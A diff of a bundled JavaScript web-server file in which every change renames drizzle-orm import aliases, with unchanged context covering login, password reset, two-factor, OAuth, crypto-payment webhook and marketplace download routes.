@@ -63308,7 +63816,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available" });
       }
-      const result = await db.select().from(passwordResetTokens).where(eq58(passwordResetTokens.token, token)).limit(1);
+      const result = await db.select().from(passwordResetTokens).where(eq59(passwordResetTokens.token, token)).limit(1);
       if (result.length === 0) {
         return res.status(400).json({ error: "Invalid or expired reset link" });
       }
@@ -63320,8 +63828,8 @@ function registerEmailAuthRoutes(app) {
         return res.status(400).json({ error: "This reset link has expired. Please request a new one." });
       }
       const passwordHash = await bcrypt3.hash(password, SALT_ROUNDS);
-      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq58(users.id, resetToken.userId));
-      await db.update(passwordResetTokens).set({ usedAt: /* @__PURE__ */ new Date() }).where(eq58(passwordResetTokens.id, resetToken.id));
+      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq59(users.id, resetToken.userId));
+      await db.update(passwordResetTokens).set({ usedAt: /* @__PURE__ */ new Date() }).where(eq59(passwordResetTokens.id, resetToken.id));
       log55.info(`[Password Reset] Password successfully reset for userId: ${resetToken.userId}`);
       return res.json({
         success: true,
@@ -63356,8 +63864,8 @@ function registerEmailAuthRoutes(app) {
         return res.status(500).json({ error: "Database not available" });
       }
       const result = await db.select().from(users).where(
-        and43(
-          eq58(users.email, normalizedEmail),
+        and44(
+          eq59(users.email, normalizedEmail),
           isNotNull3(users.passwordHash)
         )
       ).limit(1);
@@ -63397,7 +63905,7 @@ function registerEmailAuthRoutes(app) {
         loginUpdate.role = normalizedEmail === ENV.headAdminEmail ? "head_admin" : "admin";
         log55.info(`[EmailAuth] Auto-promoted user to ${loginUpdate.role} on login: ${normalizedEmail}`);
       }
-      await db.update(users).set(loginUpdate).where(eq58(users.id, user.id));
+      await db.update(users).set(loginUpdate).where(eq59(users.id, user.id));
       const sessionToken = await sdk.createSessionToken(user.openId, {
         name: user.name || normalizedEmail.split("@")[0],
         expiresInMs: ONE_YEAR_MS
@@ -63405,10 +63913,10 @@ function registerEmailAuthRoutes(app) {
       const cookieOptions = getSessionCookieOptions(req);
       res.cookie(COOKIE_NAME, sessionToken, { ...cookieOptions, maxAge: ONE_YEAR_MS });
       await db.update(identityProviders).set({ lastUsedAt: /* @__PURE__ */ new Date() }).where(
-        and43(
-          eq58(identityProviders.userId, user.id),
-          eq58(identityProviders.provider, "email"),
-          eq58(identityProviders.providerAccountId, normalizedEmail)
+        and44(
+          eq59(identityProviders.userId, user.id),
+          eq59(identityProviders.provider, "email"),
+          eq59(identityProviders.providerAccountId, normalizedEmail)
         )
       ).catch(() => {
       });
@@ -63454,7 +63962,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available" });
       }
-      const result = await db.select().from(users).where(eq58(users.id, sessionUser.id)).limit(1);
+      const result = await db.select().from(users).where(eq59(users.id, sessionUser.id)).limit(1);
       if (result.length === 0 || !result[0].passwordHash) {
         return res.status(400).json({ error: "Password change is not available for OAuth accounts. Please use your OAuth provider to manage your password." });
       }
@@ -63464,7 +63972,7 @@ function registerEmailAuthRoutes(app) {
         return res.status(401).json({ error: "Current password is incorrect" });
       }
       const passwordHash = await bcrypt3.hash(newPassword, SALT_ROUNDS);
-      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq58(users.id, user.id));
+      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq59(users.id, user.id));
       return res.json({ success: true, message: "Password changed successfully" });
     } catch (error) {
       log55.error("[Email Auth] Change password failed:", { error: String(error) });
@@ -63496,7 +64004,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available" });
       }
-      const result = await db.select().from(users).where(eq58(users.id, sessionUser.id)).limit(1);
+      const result = await db.select().from(users).where(eq59(users.id, sessionUser.id)).limit(1);
       if (result.length === 0) {
         return res.status(404).json({ error: "User not found" });
       }
@@ -63504,7 +64012,7 @@ function registerEmailAuthRoutes(app) {
         return res.status(400).json({ error: "You already have a password set. Use the change password form instead." });
       }
       const passwordHash = await bcrypt3.hash(newPassword, SALT_ROUNDS);
-      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq58(users.id, sessionUser.id));
+      await db.update(users).set({ passwordHash, updatedAt: /* @__PURE__ */ new Date() }).where(eq59(users.id, sessionUser.id));
       return res.json({ success: true, message: "Password set successfully. You can now use it to log in to the desktop app." });
     } catch (error) {
       log55.error("[Email Auth] Set password failed:", { error: String(error) });
@@ -63542,14 +64050,14 @@ function registerEmailAuthRoutes(app) {
           return res.status(400).json({ error: "Invalid email format" });
         }
         const normalizedEmail = newEmail.trim().toLowerCase();
-        const existing = await db.select({ id: users.id }).from(users).where(eq58(users.email, normalizedEmail)).limit(1);
+        const existing = await db.select({ id: users.id }).from(users).where(eq59(users.email, normalizedEmail)).limit(1);
         if (existing.length > 0 && existing[0].id !== sessionUser.id) {
           return res.status(409).json({ error: "This email is already in use by another account" });
         }
         updates.email = normalizedEmail;
       }
-      await db.update(users).set(updates).where(eq58(users.id, sessionUser.id));
-      const updated = await db.select({ id: users.id, name: users.name, email: users.email, role: users.role }).from(users).where(eq58(users.id, sessionUser.id)).limit(1);
+      await db.update(users).set(updates).where(eq59(users.id, sessionUser.id));
+      const updated = await db.select({ id: users.id, name: users.name, email: users.email, role: users.role }).from(users).where(eq59(users.id, sessionUser.id)).limit(1);
       return res.json({ success: true, user: updated[0] || null });
     } catch (error) {
       log55.error("[Email Auth] Update profile failed:", { error: String(error) });
@@ -63566,7 +64074,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available", verified: false });
       }
-      const result = await db.select().from(users).where(eq58(users.emailVerificationToken, token)).limit(1);
+      const result = await db.select().from(users).where(eq59(users.emailVerificationToken, token)).limit(1);
       if (result.length === 0) {
         return res.status(400).json({ error: "Invalid or expired verification link", verified: false });
       }
@@ -63582,7 +64090,7 @@ function registerEmailAuthRoutes(app) {
         emailVerificationToken: null,
         emailVerificationExpires: null,
         updatedAt: /* @__PURE__ */ new Date()
-      }).where(eq58(users.id, user.id));
+      }).where(eq59(users.id, user.id));
       log55.info(`[Email Auth] Email verified for userId: ${user.id}, email: ${user.email}`);
       await notifyOwner({
         title: `New Verified User: ${user.name || user.email}`,
@@ -63609,7 +64117,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available" });
       }
-      const result = await db.select().from(users).where(eq58(users.email, normalizedEmail)).limit(1);
+      const result = await db.select().from(users).where(eq59(users.email, normalizedEmail)).limit(1);
       if (result.length === 0 || result[0].emailVerified) {
         return res.json({ success: true, message: "If an account exists with that email, a verification link has been sent." });
       }
@@ -63620,7 +64128,7 @@ function registerEmailAuthRoutes(app) {
         emailVerificationToken: verificationToken,
         emailVerificationExpires: verificationExpires,
         updatedAt: /* @__PURE__ */ new Date()
-      }).where(eq58(users.id, user.id));
+      }).where(eq59(users.id, user.id));
       const baseUrl = req.headers.origin || getPublicOrigin(req);
       const verifyUrl = `${baseUrl}/verify-email?token=${verificationToken}`;
       await sendVerificationEmail(
@@ -63657,7 +64165,7 @@ function registerEmailAuthRoutes(app) {
       if (!db) {
         return res.status(500).json({ error: "Database not available" });
       }
-      const result = await db.select().from(users).where(eq58(users.id, pending.userId)).limit(1);
+      const result = await db.select().from(users).where(eq59(users.id, pending.userId)).limit(1);
       if (result.length === 0) {
         pendingTwoFactorLogins.delete(twoFactorToken);
         return res.status(401).json({ error: "User not found" });
@@ -63681,7 +64189,7 @@ function registerEmailAuthRoutes(app) {
             usedBackupCode = true;
             const updatedCodes = [...user.twoFactorBackupCodes];
             updatedCodes.splice(i, 1);
-            await db.update(users).set({ twoFactorBackupCodes: updatedCodes }).where(eq58(users.id, user.id));
+            await db.update(users).set({ twoFactorBackupCodes: updatedCodes }).where(eq59(users.id, user.id));
             break;
           }
         }
@@ -63690,7 +64198,7 @@ function registerEmailAuthRoutes(app) {
         return res.status(401).json({ error: "Invalid verification code" });
       }
       pendingTwoFactorLogins.delete(twoFactorToken);
-      await db.update(users).set({ lastSignedIn: /* @__PURE__ */ new Date() }).where(eq58(users.id, user.id));
+      await db.update(users).set({ lastSignedIn: /* @__PURE__ */ new Date() }).where(eq59(users.id, user.id));
       const sessionToken = await sdk.createSessionToken(pending.openId, {
         name: pending.name,
         expiresInMs: ONE_YEAR_MS
@@ -63698,10 +64206,10 @@ function registerEmailAuthRoutes(app) {
       const cookieOptions = getSessionCookieOptions(req);
       res.cookie(COOKIE_NAME, sessionToken, { ...cookieOptions, maxAge: ONE_YEAR_MS });
       await db.update(identityProviders).set({ lastUsedAt: /* @__PURE__ */ new Date() }).where(
-        and43(
-          eq58(identityProviders.userId, user.id),
-          eq58(identityProviders.provider, "email"),
-          eq58(identityProviders.providerAccountId, pending.email)
+        and44(
+          eq59(identityProviders.userId, user.id),
+          eq59(identityProviders.provider, "email"),
+          eq59(identityProviders.providerAccountId, pending.email)
         )
       ).catch(() => {
       });
@@ -63726,7 +64234,7 @@ function registerEmailAuthRoutes(app) {
 init_db();
 init_schema();
 import crypto19 from "crypto";
-import { eq as eq59, and as and44 } from "drizzle-orm";
+import { eq as eq60, and as and45 } from "drizzle-orm";
 init_const();
 init_env();
 init_logger();
@@ -63872,23 +64380,23 @@ async function getGoogleUser(accessToken) {
 async function findOrCreateOAuthUser(opts) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
-  const existingLink = await db.select({ userId: identityProviders.userId }).from(identityProviders).where(and44(eq59(identityProviders.provider, opts.provider), eq59(identityProviders.providerAccountId, opts.providerAccountId))).limit(1);
+  const existingLink = await db.select({ userId: identityProviders.userId }).from(identityProviders).where(and45(eq60(identityProviders.provider, opts.provider), eq60(identityProviders.providerAccountId, opts.providerAccountId))).limit(1);
   if (existingLink.length > 0) {
-    const user = await db.select().from(users).where(eq59(users.id, existingLink[0].userId)).limit(1);
+    const user = await db.select().from(users).where(eq60(users.id, existingLink[0].userId)).limit(1);
     if (user.length > 0) {
-      await db.update(identityProviders).set({ lastUsedAt: /* @__PURE__ */ new Date() }).where(and44(eq59(identityProviders.provider, opts.provider), eq59(identityProviders.providerAccountId, opts.providerAccountId)));
+      await db.update(identityProviders).set({ lastUsedAt: /* @__PURE__ */ new Date() }).where(and45(eq60(identityProviders.provider, opts.provider), eq60(identityProviders.providerAccountId, opts.providerAccountId)));
       const updateFields = { lastSignedIn: /* @__PURE__ */ new Date() };
       if (!isAdminRole(user[0].role) && shouldBeAdmin(user[0].openId, user[0].email, user[0].id)) {
         updateFields.role = user[0].email && user[0].email.toLowerCase() === ENV.headAdminEmail ? "head_admin" : "admin";
         log56.info(`[Auth] Auto-promoted existing user to ${updateFields.role} on login: ${user[0].email || user[0].openId}`);
       }
-      await db.update(users).set(updateFields).where(eq59(users.id, user[0].id));
+      await db.update(users).set(updateFields).where(eq60(users.id, user[0].id));
       const effectiveRole = updateFields.role || user[0].role;
       return { userId: user[0].id, openId: user[0].openId, name: user[0].name || "", isNew: false };
     }
   }
   if (opts.email) {
-    const existingUser = await db.select().from(users).where(eq59(users.email, opts.email.toLowerCase())).limit(1);
+    const existingUser = await db.select().from(users).where(eq60(users.email, opts.email.toLowerCase())).limit(1);
     if (existingUser.length > 0) {
       await db.insert(identityProviders).values({
         userId: existingUser[0].id,
@@ -63905,7 +64413,7 @@ async function findOrCreateOAuthUser(opts) {
         updateFields.role = existingUser[0].email && existingUser[0].email.toLowerCase() === ENV.headAdminEmail ? "head_admin" : "admin";
         log56.info(`[Auth] Auto-promoted existing user to ${updateFields.role} on login: ${existingUser[0].email || existingUser[0].openId}`);
       }
-      await db.update(users).set(updateFields).where(eq59(users.id, existingUser[0].id));
+      await db.update(users).set(updateFields).where(eq60(users.id, existingUser[0].id));
       return { userId: existingUser[0].id, openId: existingUser[0].openId, name: existingUser[0].name || "", isNew: false };
     }
   }
@@ -63934,7 +64442,7 @@ async function findOrCreateOAuthUser(opts) {
     emailVerified: true,
     lastSignedIn: /* @__PURE__ */ new Date()
   });
-  const newUser = await db.select().from(users).where(eq59(users.openId, openId)).limit(1);
+  const newUser = await db.select().from(users).where(eq60(users.openId, openId)).limit(1);
   if (newUser.length === 0) throw new Error("Failed to create user");
   await db.insert(identityProviders).values({
     userId: newUser[0].id,
@@ -64126,7 +64634,7 @@ init_storage();
 init_db();
 init_db();
 init_schema();
-import { eq as eq60 } from "drizzle-orm";
+import { eq as eq61 } from "drizzle-orm";
 import crypto20 from "crypto";
 var log57 = createLogger("ModuleGenerator");
 var MODULES_PER_CYCLE2 = 3;
@@ -64212,7 +64720,7 @@ async function getSellerUserId2(botOpenId) {
   try {
     const dbInst = await getDb();
     if (!dbInst) return null;
-    const rows = await dbInst.select({ id: users.id }).from(users).where(eq60(users.openId, botOpenId)).limit(1);
+    const rows = await dbInst.select({ id: users.id }).from(users).where(eq61(users.openId, botOpenId)).limit(1);
     return rows[0]?.id ?? null;
   } catch {
     return null;
@@ -64531,7 +65039,7 @@ init_db();
 init_schema();
 init_logger();
 init_errors();
-import { eq as eq61 } from "drizzle-orm";
+import { eq as eq62 } from "drizzle-orm";
 var log58 = createLogger("BinancePayWebhook");
 function registerBinancePayWebhook(app) {
   app.post(
@@ -64597,18 +65105,18 @@ function registerBinancePayWebhook(app) {
             cryptoAmount: String(data.orderAmount || data.paymentInfo?.orderAmount || "0"),
             paidAt: /* @__PURE__ */ new Date(),
             webhookData: JSON.stringify(data)
-          }).where(eq61(cryptoPayments.merchantTradeNo, merchantTradeNo));
-          const [payment] = await db.select().from(cryptoPayments).where(eq61(cryptoPayments.merchantTradeNo, merchantTradeNo)).limit(1);
+          }).where(eq62(cryptoPayments.merchantTradeNo, merchantTradeNo));
+          const [payment] = await db.select().from(cryptoPayments).where(eq62(cryptoPayments.merchantTradeNo, merchantTradeNo)).limit(1);
           if (payment && payment.campaignId) {
             const { crowdfundingCampaigns: crowdfundingCampaigns2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-            const [campaign] = await db.select().from(crowdfundingCampaigns2).where(eq61(crowdfundingCampaigns2.id, payment.campaignId)).limit(1);
+            const [campaign] = await db.select().from(crowdfundingCampaigns2).where(eq62(crowdfundingCampaigns2.id, payment.campaignId)).limit(1);
             if (campaign) {
               const newAmount = (campaign.currentAmount || 0) + Math.round(parseFloat(payment.creatorAmount || "0") * 100) / 100;
               const newBackers = (campaign.backerCount || 0) + 1;
               await db.update(crowdfundingCampaigns2).set({
                 currentAmount: Math.round(newAmount),
                 backerCount: newBackers
-              }).where(eq61(crowdfundingCampaigns2.id, payment.campaignId));
+              }).where(eq62(crowdfundingCampaigns2.id, payment.campaignId));
               log58.info(`[BinancePay Webhook] Campaign #${payment.campaignId} updated: +$${payment.creatorAmount}, backers=${newBackers}`);
             }
             try {
@@ -64631,7 +65139,7 @@ function registerBinancePayWebhook(app) {
           if (merchantTradeNo) {
             const db = await getDb();
             if (db) {
-              await db.update(cryptoPayments).set({ status: "expired", webhookData: JSON.stringify(data) }).where(eq61(cryptoPayments.merchantTradeNo, merchantTradeNo));
+              await db.update(cryptoPayments).set({ status: "expired", webhookData: JSON.stringify(data) }).where(eq62(cryptoPayments.merchantTradeNo, merchantTradeNo));
             }
           }
           log58.info(`[BinancePay Webhook] Payment closed/expired`);
@@ -64821,10 +65329,10 @@ async function getUserSandboxId(userId) {
 async function getFileRecord(fileId, sandboxId) {
   const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
   const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-  const { eq: eq63, and: and45 } = await import("drizzle-orm");
+  const { eq: eq64, and: and46 } = await import("drizzle-orm");
   const db = await getDb2();
   if (!db) return null;
-  const [file] = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.id, fileId), eq63(sandboxFiles2.sandboxId, sandboxId))).limit(1);
+  const [file] = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.id, fileId), eq64(sandboxFiles2.sandboxId, sandboxId))).limit(1);
   return file || null;
 }
 async function getFileContent(file) {
@@ -64946,7 +65454,7 @@ function registerProjectDownloadRoutes(app) {
       }
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, and: and45, inArray: inArray3, desc: desc45 } = await import("drizzle-orm");
+      const { eq: eq64, and: and46, inArray: inArray3, desc: desc45 } = await import("drizzle-orm");
       const db = await getDb2();
       if (!db) {
         res.status(500).json({ error: "Database unavailable" });
@@ -64963,16 +65471,16 @@ function registerProjectDownloadRoutes(app) {
           res.status(400).json({ error: "No valid file IDs provided" });
           return;
         }
-        files = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.sandboxId, sandboxId), eq63(sandboxFiles2.isDirectory, 0), inArray3(sandboxFiles2.id, ids)));
+        files = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.sandboxId, sandboxId), eq64(sandboxFiles2.isDirectory, 0), inArray3(sandboxFiles2.id, ids)));
       } else if (conversationParam) {
         const convId = parseInt(conversationParam, 10);
         if (isNaN(convId)) {
           res.status(400).json({ error: "Invalid conversationId" });
           return;
         }
-        files = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.sandboxId, sandboxId), eq63(sandboxFiles2.isDirectory, 0), eq63(sandboxFiles2.conversationId, convId))).orderBy(desc45(sandboxFiles2.createdAt));
+        files = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.sandboxId, sandboxId), eq64(sandboxFiles2.isDirectory, 0), eq64(sandboxFiles2.conversationId, convId))).orderBy(desc45(sandboxFiles2.createdAt));
       } else if (projectParam) {
-        files = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.sandboxId, sandboxId), eq63(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
+        files = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.sandboxId, sandboxId), eq64(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
         files = files.filter((f) => {
           if (f.projectName) return f.projectName === projectParam;
           const parts = f.filePath.split("/");
@@ -64980,7 +65488,7 @@ function registerProjectDownloadRoutes(app) {
           return derivedName === projectParam;
         });
       } else if (allParam === "true") {
-        files = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.sandboxId, sandboxId), eq63(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
+        files = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.sandboxId, sandboxId), eq64(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
       } else {
         res.status(400).json({ error: "Provide ?ids=1,2,3 or ?conversationId=N or ?project=name or ?all=true" });
         return;
@@ -65119,9 +65627,9 @@ function registerMarketplaceFileRoutes(app) {
       if (database) {
         try {
           const { marketplaceListings: marketplaceListings2, marketplacePurchases: marketplacePurchases2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-          const { eq: eq63, and: and45, ne: ne3 } = await import("drizzle-orm");
-          const duplicates = await database.select({ id: marketplaceListings2.id, uid: marketplaceListings2.uid, title: marketplaceListings2.title, sellerId: marketplaceListings2.sellerId }).from(marketplaceListings2).where(and45(
-            eq63(marketplaceListings2.fileHash, fileHash),
+          const { eq: eq64, and: and46, ne: ne3 } = await import("drizzle-orm");
+          const duplicates = await database.select({ id: marketplaceListings2.id, uid: marketplaceListings2.uid, title: marketplaceListings2.title, sellerId: marketplaceListings2.sellerId }).from(marketplaceListings2).where(and46(
+            eq64(marketplaceListings2.fileHash, fileHash),
             ne3(marketplaceListings2.id, result.listingId)
           )).limit(1);
           if (duplicates.length > 0 && duplicates[0].sellerId !== listing.sellerId) {
@@ -65130,11 +65638,11 @@ function registerMarketplaceFileRoutes(app) {
               existingListing: duplicates[0].uid
             });
           }
-          const sellerPurchases = await database.select({ listingId: marketplacePurchases2.listingId }).from(marketplacePurchases2).where(eq63(marketplacePurchases2.buyerId, user.id));
+          const sellerPurchases = await database.select({ listingId: marketplacePurchases2.listingId }).from(marketplacePurchases2).where(eq64(marketplacePurchases2.buyerId, user.id));
           if (sellerPurchases.length > 0) {
             const purchasedListingIds = sellerPurchases.map((p) => p.listingId);
             for (const purchasedId of purchasedListingIds) {
-              const purchasedListing = await database.select({ fileHash: marketplaceListings2.fileHash }).from(marketplaceListings2).where(eq63(marketplaceListings2.id, purchasedId)).limit(1);
+              const purchasedListing = await database.select({ fileHash: marketplaceListings2.fileHash }).from(marketplaceListings2).where(eq64(marketplaceListings2.id, purchasedId)).limit(1);
               if (purchasedListing.length > 0 && purchasedListing[0].fileHash === fileHash) {
                 return res.status(403).json({
                   error: "Anti-resale protection: You cannot re-list an item you purchased. Only original work and upgrade packs are allowed."
@@ -65209,8 +65717,8 @@ function registerMarketplaceFileRoutes(app) {
         return res.status(503).json({ error: "Database unavailable" });
       }
       const { marketplacePurchases: marketplacePurchases2, marketplaceListings: marketplaceListings2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63 } = await import("drizzle-orm");
-      const purchases = await database.select().from(marketplacePurchases2).where(eq63(marketplacePurchases2.downloadToken, token)).limit(1);
+      const { eq: eq64 } = await import("drizzle-orm");
+      const purchases = await database.select().from(marketplacePurchases2).where(eq64(marketplacePurchases2.downloadToken, token)).limit(1);
       if (purchases.length === 0) {
         return res.status(404).json({ error: "Invalid download token" });
       }
@@ -65236,10 +65744,10 @@ function registerMarketplaceFileRoutes(app) {
       const { sql: sql36 } = await import("drizzle-orm");
       await database.update(marketplacePurchases2).set({
         downloadCount: sql36`${marketplacePurchases2.downloadCount} + 1`
-      }).where(eq63(marketplacePurchases2.downloadToken, token));
+      }).where(eq64(marketplacePurchases2.downloadToken, token));
       await database.update(marketplaceListings2).set({
         downloadCount: sql36`${marketplaceListings2.downloadCount} + 1`
-      }).where(eq63(marketplaceListings2.id, purchase.listingId));
+      }).where(eq64(marketplaceListings2.id, purchase.listingId));
       return res.json({
         success: true,
         downloadUrl: listing.fileUrl,
@@ -65946,7 +66454,7 @@ async function startServer() {
       try {
         const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
         const { users: users4 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-        const { eq: eq63, or: or6 } = await import("drizzle-orm");
+        const { eq: eq64, or: or6 } = await import("drizzle-orm");
         const { ENV: ENV2 } = await Promise.resolve().then(() => (init_env(), env_exports));
         const db = await getDb2();
         if (!db) return;
@@ -65959,13 +66467,13 @@ async function startServer() {
         }
         if (ENV2.headAdminEmail) {
           await db.update(users4).set({ role: "head_admin" }).where(
-            eq63(users4.email, ENV2.headAdminEmail)
+            eq64(users4.email, ENV2.headAdminEmail)
           ).catch(() => {
           });
           log65.info("Head admin promotion", { email: ENV2.headAdminEmail });
         }
         await db.update(users4).set({ role: "admin" }).where(
-          eq63(users4.id, 1)
+          eq64(users4.id, 1)
         ).catch(() => {
         });
         if (ENV2.ownerEmails && ENV2.ownerEmails.length > 0) {
@@ -65981,7 +66489,7 @@ async function startServer() {
         }
         if (ENV2.ownerOpenId) {
           await db.update(users4).set({ role: "admin" }).where(
-            eq63(users4.openId, ENV2.ownerOpenId)
+            eq64(users4.openId, ENV2.ownerOpenId)
           ).catch(() => {
           });
         }
